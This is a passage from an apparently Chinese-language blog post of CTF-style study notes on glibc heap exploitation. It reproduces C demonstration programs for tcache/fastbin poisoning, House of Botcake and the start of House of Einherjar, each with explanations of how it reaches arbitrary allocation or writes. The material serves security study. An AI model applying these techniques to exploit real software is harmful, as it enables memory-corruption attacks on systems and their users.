class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;下一个分配会触发栈被覆盖。tcache 为空，但 fastbin 不是，因此下一个分配来自 fastbin。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;同时，fastbin 中使用了 7 个块来补充 tcache。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;这 7 个块以逆序复制到 tcache 中，因此我们目标的栈地址\n&quot;</span></span><br><span class="line">    <span class="string">&quot;最终成为 tcache 中的第一个块。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;它包含指向列表中下一个块的指针，这就是为什么一个堆指针会被写入栈中的原因。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;之前我们提到，如果我们释放少于 6 个额外的 fastbin 指针，攻击仍然会奏效，但前提是\n&quot;</span></span><br><span class="line">    <span class="string">&quot;栈上的值为零。这是因为栈上的值被视为链表中的下一个指针，\n&quot;</span></span><br><span class="line">    <span class="string">&quot;如果它不是有效指针或空指针，则会触发崩溃。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;我们在栈上的数组内容现在如下所示：\n\n&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-3"><a href="#适用范围-3" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
</ul>
<h3 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li>申请了14个chunk，free掉7个填满tcache</li>
<li>free(victim)，victim是我们要修改的chunk</li>
<li>再free掉6个chunk填满fastbin，</li>
<li>修改victim的fd指针，指向target</li>
<li>清空tcache,此时申请chunk会从fastbin中取出，同时将fastbin中剩余的chunk<strong>逆序放入</strong>tcache中，我们第一个free的chunk(即victim)的fd(即栈地址)成为了tcache中的首个chunk，<strong>实现向target的fd,bk写入堆地址</strong></li>
<li>最后申请一次就可以直接申请出这个target伪造的chunk</li>
</ul>
<p>**注意：**若栈地址上的内容都为零，在fastbin中放入vicitm即可（无需再放6个）</p>
<h3 id="相关技巧-3"><a href="#相关技巧-3" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-3"><a href="#利用效果-3" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址写入一个堆地址，任意地址分配</p>
<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><p>本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果</p>
<p>效果：任意地址分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * 就是2.29新引入的key机制，检查tcache_double</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先程序先在栈上声明了一个变量</p>
<p>之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备</p>
<p>然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)</p>
<p>到此准备工作就结束了；</p>
<p>下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache</p>
<p>之后程序free掉了a，a被放入了unsorted bin中</p>
<p>此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中</p>
<p>此时free list上就没有了a的信息</p>
<p>现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了</p>
<p>此时，我们的a既在tcache中，又在unsortedbin的大chunk中</p>
<p>也就是完成了一个<strong>double free</strong></p>
<p>之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted bin中</p>
<p>此时的b是从之前prev的位置开始的，因此我们<strong>通过覆写b来将我们a的fwd指针指向栈上</strong></p>
<p>此时，我们再申请两次就可以分配到栈上的地址了</p>
<h3 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>double free</p>
<h3 id="适用范围-4"><a href="#适用范围-4" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
<li>多次释放 <code>chunk</code> 的能力</li>
</ul>
<h3 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h3><p>该技巧可以用于绕过 <code>tcache-&gt;key</code> 的检查，利用过程如下：</p>
<ul>
<li>申请 <code>7</code> 个大小相同，大小大于 <code>0x80</code> 的 <code>chunk</code>，再申请三个，分别为 <code>chunk A</code> 和 <code>chunkB</code> 和 <code>chunk C</code></li>
<li>释放前 <code>7</code> 个和 <code>chunk A</code>，前面 <code>7</code> 个都会进入到 <code>tcachebin</code> 里面，<code>chunk A</code> 进入到 <code>unsortedbin</code></li>
<li>释放 <code>chunk B</code>，则 <code>chunk B</code> 会和 <code>chunk A</code> 合并</li>
<li>从 <code>tcachebin</code> 分配走一个</li>
<li>再次释放 <code>chunk B</code>，此时 <code>B</code> 同时存在与 <code>unsortedbin</code> 和 <code>tcachebin</code></li>
</ul>
<h3 id="相关技巧-4"><a href="#相关技巧-4" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>在高版本需要绕过指针保护的检查</li>
</ul>
<h3 id="利用效果-4"><a href="#利用效果-4" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>构造出堆重叠，为后续利用做准备</li>
</ul>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><p>效果：任意地址分配</p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/#_1">ctf-wiki</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This modification to The House of Enherjar, made by Huascar Tejeda - @htejeda, works with the tcache-option enabled on glibc-2.31.</span></span><br><span class="line"><span class="comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">     * It has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">     * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *) &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">    a[<span class="number">2</span>] = (<span class="type">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">    a[<span class="number">3</span>] = (<span class="type">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *b = (<span class="type">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">    <span 